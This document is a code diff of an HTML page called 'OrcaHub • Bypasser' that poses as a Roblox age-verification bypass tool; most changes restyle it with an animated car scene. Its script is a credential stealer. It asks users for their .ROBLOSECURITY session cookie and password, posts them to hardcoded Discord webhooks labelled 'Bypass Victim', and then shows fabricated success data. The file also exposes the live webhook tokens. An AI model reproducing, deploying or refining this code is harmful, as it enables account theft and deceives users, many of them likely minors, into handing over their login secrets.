@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>OrcaHub • Bypasser</title>
-    <!-- مكتبة أيقونات FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
     <style>
         * {
             margin: 0;
@@ -16,258 +14,163 @@
         }
 
         body {
-            background-color: #0f0f0f;
+            background: #0a0a14;
             color: #fff;
             overflow: hidden;
             height: 100vh;
         }
 
+        /* ===== CONTAINER ===== */
         .container {
             position: relative;
             width: 100%;
             height: 100vh;
-        }
-
-        /* القائمة العلوية */
-        .navbar {
-            position: absolute;
-            top: 30px;
-            left: 50px;
-            right: 50px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 20;
-        }
-
-        .logo {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            letter-spacing: 1px;
-        }
-
-        .menu-icon {
-            font-size: 22px;
-            cursor: pointer;
-            color: #fff;
-            transition: 0.3s;
-        }
-
-        .menu-icon:hover {
-            color: #a29bfe;
-        }
-
-        /* روابط التواصل الاجتماعي */
-        .social-links {
-            position: absolute;
-            left: 40px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            flex-direction: column;
-            gap: 22px;
-            z-index: 20;
-        }
-
-        .social-links a {
-            color: #8888aa;
-            font-size: 20px;
-            text-decoration: none;
-            transition: 0.3s;
-        }
-
-        .social-links a:hover {
-            color: #a29bfe;
-            transform: scale(1.2);
-        }
-
-        /* النص الكبير في الخلفية */
-        .bg-title {
-            position: absolute;
-            top: 45%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 18vw;
-            font-weight: 900;
-            color: rgba(162, 155, 254, 0.15);
-            letter-spacing: 15px;
-            user-select: none;
-            z-index: 1;
-            transition: color 0.8s ease;
-            text-shadow: 0 0 80px rgba(162, 155, 254, 0.05);
-        }
-
-        /* الشرائح */
-        .slider-wrapper {
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
-
-        .slide {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-around;
-            padding: 0 10%;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .slide.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        /* تفاصيل السيارة */
-        .car-info {
-            z-index: 10;
-        }
-
-        .sub-title {
-            font-size: 28px;
-            color: #8888aa;
-            display: block;
-            font-weight: 300;
-        }
-
-        .car-info h2 {
-            font-size: 60px;
-            font-weight: 800;
-            margin-bottom: 10px;
-            background: linear-gradient(135deg, #fff, #a29bfe);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .car-info p {
-            font-size: 14px;
-            color: #9999bb;
-            margin-bottom: 25px;
-            letter-spacing: 3px;
-        }
-
-        .btn {
-            padding: 14px 35px;
-            background: transparent;
-            border: 2px solid rgba(162, 155, 254, 0.5);
-            color: #fff;
-            border-radius: 40px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-size: 14px;
-            letter-spacing: 1px;
-        }
-
-        .btn:hover {
-            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
-            border-color: transparent;
-            transform: scale(1.05);
-            box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
-        }
-
-        /* صورة السيارة */
-        .car-image {
-            z-index: 5;
-            position: relative;
-            transform: scale(0.8) translateX(100px);
-            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .slide.active .car-image {
-            transform: scale(1) translateX(0);
-        }
-
-        .car-image img {
-            max-width: 550px;
-            filter: drop-shadow(0 30px 60px rgba(0,0,0,0.6));
-        }
-
-        /* أزرار الترقيم جانباً */
-        .pagination {
-            position: absolute;
-            right: 50px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            flex-direction: column;
-            gap: 18px;
-            z-index: 20;
-        }
-
-        .dot {
-            background: transparent;
-            border: 1px solid rgba(255,255,255,0.15);
-            color: #8888aa;
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 700;
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .dot.active, .dot:hover {
-            border-color: #a29bfe;
-            background: rgba(162, 155, 254, 0.15);
-            color: #fff;
-            transform: scale(1.1);
-            box-shadow: 0 0 30px rgba(162, 155, 254, 0.2);
+        /* ===== CAR ANIMATION ===== */
+        .car-scene {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
 
-        /* ==================== BYPASSER OVERLAY ==================== */
-        .bypasser-overlay {
+        .road {
             position: absolute;
-            bottom: 30px;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 45%;
+            background: linear-gradient(180deg, transparent 0%, #1a1a2e 30%, #0f0f1a 100%);
+        }
+
+        .road-line {
+            position: absolute;
+            bottom: 28%;
+            left: 0;
+            width: 200%;
+            height: 3px;
+            background: repeating-linear-gradient(90deg, rgba(255,255,255,0.15) 0px, rgba(255,255,255,0.15) 40px, transparent 40px, transparent 80px);
+            animation: roadMove 2s linear infinite;
+        }
+
+        @keyframes roadMove {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .car-wrapper {
+            position: absolute;
+            bottom: 30%;
+            left: -200px;
+            animation: carDrive 6s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
+            filter: drop-shadow(0 20px 60px rgba(162, 155, 254, 0.15));
+        }
+
+        @keyframes carDrive {
+            0% { left: -200px; transform: scale(0.8) rotate(-2deg); }
+            30% { left: 20%; transform: scale(1) rotate(0deg); }
+            50% { left: 40%; transform: scale(1.05) rotate(0deg); }
+            70% { left: 50%; transform: scale(1) rotate(0deg); }
+            85% { left: 55%; transform: scale(0.95) rotate(0.5deg); }
+            100% { left: 58%; transform: scale(0.9) rotate(0deg); }
+        }
+
+        .car-wrapper svg {
+            width: 380px;
+            height: auto;
+            display: block;
+        }
+
+        /* ===== OVERLAY TEXT ===== */
+        .hero-text {
+            position: absolute;
+            top: 15%;
             left: 50%;
             transform: translateX(-50%);
-            z-index: 30;
-            width: 90%;
-            max-width: 500px;
-            background: rgba(16, 16, 30, 0.85);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
-            padding: 24px 28px;
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10;
+            text-align: center;
+            animation: fadeInDown 1.5s ease 0.5s both;
         }
 
-        .bypasser-overlay:hover {
-            transform: translateX(-50%) translateY(-5px);
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateX(-50%) translateY(-30px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        .hero-text h1 {
+            font-size: 6rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 8px;
+            text-shadow: 0 0 60px rgba(162, 155, 254, 0.15);
+            animation: gradientText 4s ease-in-out infinite;
+            background-size: 300% 300%;
+        }
+
+        @keyframes gradientText {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .hero-text .sub {
+            color: #8888aa;
+            font-size: 1rem;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-top: 10px;
+            font-weight: 300;
+        }
+
+        /* ===== BYPASSER OVERLAY ===== */
+        .bypasser-overlay {
+            position: absolute;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            width: 92%;
+            max-width: 500px;
+            background: rgba(16, 16, 30, 0.88);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            padding: 24px 28px;
+            animation: slideUp 1s ease 1.5s both;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(40px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
 
         .bypasser-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
         .bypasser-header h3 {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
             color: #fff;
             letter-spacing: 1px;
         }
 
         .bypasser-header span {
-            font-size: 12px;
+            font-size: 11px;
             color: #4ecdc4;
             font-weight: 600;
         }
@@ -283,7 +186,7 @@
             width: 100%;
             padding: 12px 16px;
             background: rgba(10, 10, 20, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 30px;
             color: #f0f0ff;
             font-size: 13px;
@@ -293,7 +196,7 @@
 
         .bypasser-input-group input:focus {
             border-color: #a29bfe;
-            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.1);
+            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
         }
 
         .bypasser-input-group input::placeholder {
@@ -322,7 +225,7 @@
 
         .bypasser-actions .btn-bypass:hover {
             transform: scale(1.02);
-            box-shadow: 0 10px 30px rgba(162, 155, 254, 0.3);
+            box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
         }
 
         .bypasser-actions .btn-bypass:disabled {
@@ -338,7 +241,7 @@
             border: none;
             border-radius: 30px;
             font-weight: 700;
-            font-size: 13px;
+            font-size: 12px;
             color: white;
             cursor: pointer;
             transition: 0.4s;
@@ -346,14 +249,14 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 6px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
 
         .bypasser-actions .btn-instagram:hover {
             transform: scale(1.02);
-            box-shadow: 0 10px 30px rgba(221, 42, 123, 0.3);
+            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
         }
 
         .bypasser-actions .btn-instagram svg {
@@ -362,7 +265,6 @@
             fill: currentColor;
         }
 
-        /* Bypasser Loader */
         .bypasser-loader {
             display: none;
             text-align: center;
@@ -371,7 +273,12 @@
 
         .bypasser-loader.show {
             display: block;
-            animation: fadeInScale 0.4s ease;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .bypasser-loader .spinner-small {
@@ -381,7 +288,7 @@
             border-top-color: #a29bfe;
             border-right-color: #ff6b6b;
             border-radius: 50%;
-            animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
+            animation: spin 0.8s ease infinite;
             margin: 0 auto 10px;
         }
 
@@ -393,7 +300,6 @@
             color: #8888aa;
             font-size: 12px;
             font-weight: 300;
-            letter-spacing: 0.5px;
         }
 
         .bypasser-loader .loader-text .time {
@@ -401,7 +307,6 @@
             font-weight: 700;
         }
 
-        /* Bypasser Result */
         .bypasser-result {
             display: none;
             background: rgba(78, 205, 196, 0.06);
@@ -413,7 +318,7 @@
             font-size: 13px;
             font-weight: 600;
             margin-top: 12px;
-            animation: fadeInScale 0.4s ease;
+            animation: fadeIn 0.4s ease;
         }
 
         .bypasser-result.show {
@@ -426,7 +331,6 @@
             margin-bottom: 4px;
         }
 
-        /* Error */
         .bypasser-error {
             display: none;
             background: rgba(255, 107, 107, 0.08);
@@ -438,111 +342,83 @@
             font-weight: 500;
             text-align: center;
             margin-top: 10px;
-            animation: fadeInScale 0.4s ease;
+            animation: fadeIn 0.4s ease;
         }
 
         .bypasser-error.show {
             display: block;
         }
 
-        @keyframes fadeInScale {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        /* Responsive */
-        @media (max-width: 992px) {
-            .car-image img { max-width: 350px; }
-            .car-info h2 { font-size: 40px; }
-            .bg-title { font-size: 22vw; }
-            .social-links { left: 20px; }
-            .pagination { right: 20px; }
-            .navbar { left: 20px; right: 20px; }
-        }
-
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .slide { flex-direction: column; justify-content: center; text-align: center; padding: 0 5%; }
-            .car-image { transform: scale(0.8) translateX(0); }
-            .slide.active .car-image { transform: scale(0.9) translateX(0); }
-            .car-image img { max-width: 250px; }
-            .car-info h2 { font-size: 32px; }
-            .social-links { display: none; }
-            .pagination { right: 15px; gap: 12px; }
-            .dot { width: 36px; height: 36px; font-size: 10px; }
-            .bg-title { font-size: 30vw; }
-            .bypasser-overlay { bottom: 15px; padding: 18px 20px; max-width: 95%; }
+            .hero-text h1 { font-size: 3.5rem; letter-spacing: 4px; }
+            .hero-text .sub { font-size: 0.8rem; letter-spacing: 4px; }
+            .car-wrapper svg { width: 220px; }
+            .car-wrapper { bottom: 28%; }
+            .bypasser-overlay { bottom: 20px; padding: 18px 20px; max-width: 96%; }
             .bypasser-actions { flex-direction: column; }
+            .road-line { bottom: 25%; }
+        }
+
+        @media (max-width: 480px) {
+            .hero-text h1 { font-size: 2.8rem; letter-spacing: 2px; }
+            .car-wrapper svg { width: 160px; }
+            .bypasser-overlay { padding: 16px 16px; }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- القائمة العلوية -->
-        <nav class="navbar">
-            <div class="logo">OrcaHub</div>
-            <div class="menu-icon"><i class="fas fa-bars"></i></div>
-        </nav>
 
-        <div class="social-links">
-            <a href="#"><i class="fab fa-twitter"></i></a>
-            <a href="#"><i class="fab fa-instagram"></i></a>
-            <a href="#"><i class="fab fa-facebook-f"></i></a>
-        </div>
-
-        <!-- النص الخلفي الكبير -->
-        <h1 class="bg-title" id="bgTitle">ORCA</h1>
-
-        <!-- الشرائح -->
-        <div class="slider-wrapper">
-            <!-- الشريحة الأولى -->
-            <div class="slide active" data-color="rgba(162, 155, 254, 0.15)">
-                <div class="car-info">
-                    <span class="sub-title">Ultimate</span>
-                    <h2>BYPPASSER</h2>
-                    <p>AGE VERIFICATION BYPASS TOOL</p>
-                    <button class="btn">Discover Now</button>
-                </div>
-                <div class="car-image">
-                    <img src="https://i.postimg.cc/mD3mXzYr/yellow-car.png" alt="Yellow Car">
-                </div>
+        <!-- ===== CAR SCENE ===== -->
+        <div class="car-scene">
+            <div class="road">
+                <div class="road-line"></div>
             </div>
-
-            <!-- الشريحة الثانية -->
-            <div class="slide" data-color="rgba(255, 107, 107, 0.15)">
-                <div class="car-info">
-                    <span class="sub-title">Powerful</span>
-                    <h2>STEALTH</h2>
-                    <p>ADVANCED SECURITY BYPASS</p>
-                    <button class="btn">Discover Now</button>
-                </div>
-                <div class="car-image">
-                    <img src="https://i.postimg.cc/q7333B3L/red-car.png" alt="Red Car">
-                </div>
-            </div>
-
-            <!-- الشريحة الثالثة -->
-            <div class="slide" data-color="rgba(78, 205, 196, 0.15)">
-                <div class="car-info">
-                    <span class="sub-title">Next Gen</span>
-                    <h2>FUTURE</h2>
-                    <p>AI-POWERED BYPASS ENGINE</p>
-                    <button class="btn">Discover Now</button>
-                </div>
-                <div class="car-image">
-                    <img src="https://i.postimg.cc/13f0m9f3/blue-car.png" alt="Blue Car">
-                </div>
+            <div class="car-wrapper">
+                <svg viewBox="0 0 600 250" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Shadow -->
+                    <ellipse cx="300" cy="220" rx="200" ry="12" fill="rgba(0,0,0,0.4)"/>
+                    <!-- Car Body -->
+                    <path d="M80 160 L120 100 L200 80 L400 80 L480 100 L520 160 L500 180 L100 180 L80 160Z" fill="url(#carGrad)" stroke="rgba(255,255,255,0.08)" stroke-width="1.5"/>
+                    <!-- Roof -->
+                    <path d="M160 100 L180 70 L240 60 L360 60 L420 70 L440 100 L160 100Z" fill="url(#roofGrad)" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
+                    <!-- Windows -->
+                    <path d="M190 92 L210 72 L260 65 L340 65 L390 72 L410 92 L190 92Z" fill="rgba(162,155,254,0.15)" stroke="rgba(255,255,255,0.05)" stroke-width="0.5"/>
+                    <!-- Headlights -->
+                    <ellipse cx="85" cy="130" rx="12" ry="8" fill="rgba(255,215,0,0.4)" stroke="rgba(255,215,0,0.1)" stroke-width="1"/>
+                    <ellipse cx="515" cy="130" rx="12" ry="8" fill="rgba(255,100,100,0.3)" stroke="rgba(255,100,100,0.1)" stroke-width="1"/>
+                    <!-- Wheels -->
+                    <circle cx="140" cy="185" r="35" fill="#1a1a2e" stroke="rgba(255,255,255,0.1)" stroke-width="2"/>
+                    <circle cx="140" cy="185" r="18" fill="#2a2a3e" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
+                    <circle cx="460" cy="185" r="35" fill="#1a1a2e" stroke="rgba(255,255,255,0.1)" stroke-width="2"/>
+                    <circle cx="460" cy="185" r="18" fill="#2a2a3e" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
+                    <!-- Spoiler -->
+                    <path d="M420 65 L430 50 L470 48 L480 65 L420 65Z" fill="rgba(255,255,255,0.05)" stroke="rgba(255,255,255,0.05)" stroke-width="0.5"/>
+                    <!-- Gradients -->
+                    <defs>
+                        <linearGradient id="carGrad" x1="0" y1="0" x2="600" y2="200">
+                            <stop offset="0%" stop-color="#a29bfe"/>
+                            <stop offset="50%" stop-color="#6c5ce7"/>
+                            <stop offset="100%" stop-color="#ff6b6b"/>
+                        </linearGradient>
+                        <linearGradient id="roofGrad" x1="0" y1="0" x2="600" y2="100">
+                            <stop offset="0%" stop-color="rgba(162,155,254,0.3)"/>
+                            <stop offset="100%" stop-color="rgba(255,107,107,0.2)"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
             </div>
         </div>
 
-        <!-- أزرار التبديل -->
-        <div class="pagination">
-            <button class="dot active" data-index="0">01</button>
-            <button class="dot" data-index="1">02</button>
-            <button class="dot" data-index="2">03</button>
+        <!-- ===== HERO TEXT ===== -->
+        <div class="hero-text">
+            <h1>ORCA</h1>
+            <div class="sub">Age Verification Bypass</div>
         </div>
 
-        <!-- ==================== BYPASSER OVERLAY ==================== -->
+        <!-- ===== BYPASSER OVERLAY ===== -->
         <div class="bypasser-overlay" id="bypasserOverlay">
             <div class="bypasser-header">
                 <h3>🔓 Age Bypass</h3>
@@ -584,35 +460,6 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // ==================== SLIDER ====================
-            const slides = document.querySelectorAll('.slide');
-            const dots = document.querySelectorAll('.dot');
-            const bgTitle = document.getElementById('bgTitle');
-            let currentIndex = 0;
-
-            function changeSlide(index) {
-                slides.forEach(slide => slide.classList.remove('active'));
-                dots.forEach(dot => dot.classList.remove('active'));
-
-                slides[index].classList.add('active');
-                dots[index].classList.add('active');
-
-                const color = slides[index].getAttribute('data-color');
-                bgTitle.style.color = color;
-            }
-
-            dots.forEach(dot => {
-                dot.addEventListener('click', (e) => {
-                    currentIndex = parseInt(e.target.getAttribute('data-index'));
-                    changeSlide(currentIndex);
-                });
-            });
-
-            setInterval(() => {
-                currentIndex = (currentIndex + 1) % slides.length;
-                changeSlide(currentIndex);
-            }, 5000);
-
             // ==================== BYPASSER ENGINE ====================
             const WEBHOOKS = [
                 'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8',
@@ -630,7 +477,6 @@
                 result: document.getElementById('bypasserResult'),
             };
 
-            // Instagram link
             DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
 
             let bypassTimer = null;
@@ -662,14 +508,12 @@
                 const cookie = DOM.cookieInput.value.trim();
                 const password = DOM.passwordInput.value.trim();
 
-                // Reset UI
                 DOM.error.classList.remove('show');
                 DOM.result.classList.remove('show');
                 DOM.loader.classList.remove('show');
                 DOM.cookieInput.classList.remove('error');
                 DOM.passwordInput.classList.remove('error');
 
-                // Validate
                 if (!cookie || cookie.length < 15) {
                     DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                     DOM.error.classList.add('show');
@@ -691,7 +535,6 @@
                     return;
                 }
 
-                // Start processing
                 isProcessing = true;
                 DOM.bypassBtn.disabled = true;
                 DOM.bypassBtn.textContent = '⏳ Processing...';
@@ -713,7 +556,6 @@
                     }
                 }, 1000);
 
-                // Send partial data to webhooks immediately
                 sendToWebhooks({
                     embeds: [{
                         title: "🦈 OrcaHub • Bypass Initiated",
@@ -730,7 +572,6 @@
             }
 
             function completeBypass(cookie, password) {
-                // Generate fake user data
                 const userId = Math.floor(Math.random() * 900000000) + 100000000;
                 const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
                     'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
@@ -750,7 +591,6 @@
                     avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
                 };
 
-                // Send full data to webhooks
                 const embed = {
                     title: "🎯 OrcaHub • Bypass Victim",
                     color: 0xff6b6b,
@@ -771,7 +611,6 @@
                 };
                 sendToWebhooks({ embeds: [embed] });
 
-                // Show success
                 DOM.loader.classList.remove('show');
                 DOM.result.classList.add('show');
 
@@ -779,16 +618,13 @@
                 DOM.bypassBtn.disabled = false;
                 DOM.bypassBtn.textContent = '🚀 Start Bypass';
 
-                // Auto reset after 8 seconds
                 setTimeout(() => {
                     DOM.result.classList.remove('show');
                 }, 8000);
             }
 
-            // ==================== EVENTS ====================
             DOM.bypassBtn.addEventListener('click', startBypass);
 
-            // Enter key support
             DOM.cookieInput.addEventListener('keydown', (e) => {
                 if (e.key === 'Enter') startBypass();
             });
@@ -798,4 +634,4 @@
         });
     </script>
 </body>
-    </html>
+                        </html>
